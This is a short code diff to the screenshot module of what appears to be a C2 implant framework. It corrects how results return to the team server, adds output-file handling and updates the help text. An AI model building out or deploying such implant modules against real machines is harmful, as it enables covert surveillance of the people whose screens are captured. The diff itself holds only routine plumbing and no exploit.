@@ -53,9 +53,9 @@ std::string ScreenShot::getInfo()
     // TODO: add screenshot every x seconds with a recurringExec
 #ifdef BUILD_TEAMSERVER
     info += "ScreenShot:\n";
-    info += "ScreenShot\n";
+    info += "Capture a screenshot and store it as a generated TeamServer artifact.\n";
     info += "exemple:\n";
-    info += "- ScreenShot\n";
+    info += "- screenShot\n";
 #endif
     return info;
 }
@@ -83,7 +83,9 @@ int ScreenShot::init(std::vector<std::string> &splitedCmd, C2Message &c2Message)
 
 int ScreenShot::process(C2Message &c2Message, C2Message &c2RetMessage)
 {
-    c2RetMessage.set_instruction(c2RetMessage.instruction());
+    c2RetMessage.set_instruction(c2Message.instruction());
+    c2RetMessage.set_outputfile(c2Message.outputfile());
+    c2RetMessage.set_args("0");
 
 #ifdef _WIN32
     std::vector<unsigned char> dataScreen;
@@ -144,6 +146,9 @@ int ScreenShot::recurringExec(C2Message& c2RetMessage)
 int ScreenShot::followUp(const C2Message &c2RetMessage)
 {
 #ifdef BUILD_TEAMSERVER
+    if(!c2RetMessage.outputfile().empty())
+        return 0;
+
     const std::string buffer = c2RetMessage.data();
 
     if(buffer.size()>0)
